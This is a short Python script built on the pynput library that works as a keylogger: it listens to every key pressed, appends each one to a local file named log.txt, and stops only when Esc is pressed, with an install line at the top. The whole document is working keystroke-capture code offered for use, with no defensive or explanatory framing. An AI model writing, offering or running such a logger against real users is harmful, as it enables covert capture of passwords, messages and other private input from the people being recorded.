'''First install pynput
pip install pynput'''
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            file.write(k+"\n")
            file.write(' ')
        keys.clear()

def on_release(key):
    if key == Key.esc:
        # Stop "esc"
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
